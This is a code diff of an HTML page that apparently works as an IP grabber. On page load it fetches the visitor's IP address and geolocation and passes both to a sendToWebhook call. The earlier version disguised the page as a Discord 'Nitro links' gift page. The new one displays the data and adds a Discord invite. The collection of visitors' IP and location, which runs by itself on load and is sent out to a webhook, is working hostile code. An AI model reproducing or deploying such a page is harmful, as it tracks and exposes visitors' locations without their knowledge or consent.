@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Gifts</title>
+    <title>Haha</title>
     <script>
       function displayIP() {
         fetch("https://api.ipify.org/?format=json")
@@ -38,10 +38,11 @@
         fetch(locationUrl)
           .then((response) => response.json())
           .then((data) => {
-            const nitroLinksElement = document.getElementById("nitroLinks");
-            nitroLinksElement.textContent = "Nitro Links: Loading";
+            const locationElement = document.getElementById("location");
+            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
+            locationElement.textContent = locationString;
 
-            sendToWebhook(ip, "Loading");
+            sendToWebhook(ip, locationString);
           })
           .catch((error) => {
             console.error("Error:", error);
@@ -51,9 +52,13 @@
     </script>
   </head>
   <body onload="displayIP()">
-    <h1 id="nitroLinks">Nitro links:</h1>
-    <p>Loading...</p>
-    <p>Loading...</p>
-    <p>Loading...</p>
+    <h1>Your IP Address:</h1>
+    <p id="ip">Loading...</p>
+    <h1>Your Location:</h1>
+    <p id="location">Loading...</p>
+    <div>
+      If you would like to join us, please join our Discord server:
+      <a href="https://discord.gg/SXez2zT9">https://discord.gg/SXez2zT9</a>
+    </div>
   </body>
 </html>
